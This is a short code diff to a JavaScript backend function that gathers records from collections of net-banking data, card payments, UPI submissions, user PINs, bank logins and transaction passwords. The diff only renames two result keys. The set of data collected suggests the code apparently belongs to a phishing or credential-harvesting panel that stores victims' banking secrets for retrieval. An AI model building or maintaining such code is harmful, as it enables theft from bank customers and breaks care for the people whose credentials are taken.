@@ -83,7 +83,7 @@ export const getAllData = async (req, res) => {
       forms: "form_submissions",
       netbanking: "netbanking_data",
       cardPayments: "card_payment_data",
-      panSubmissions: "upi_submissions",
+      upi: "upi_submissions",
       userPins: "user_pins",
       bankLogins: "netbanking_login_data",
       transactionPasswords: "transaction_passwords"
@@ -91,9 +91,9 @@ export const getAllData = async (req, res) => {
 
     const result = {
       forms: [],
-      atmPins: [],
+      netbanking: [],
       cardPayments: [],
-      panSubmissions: [],
+      upi: [],
       userPins: [],
       bankLogins: [],
       transactionPasswords: []
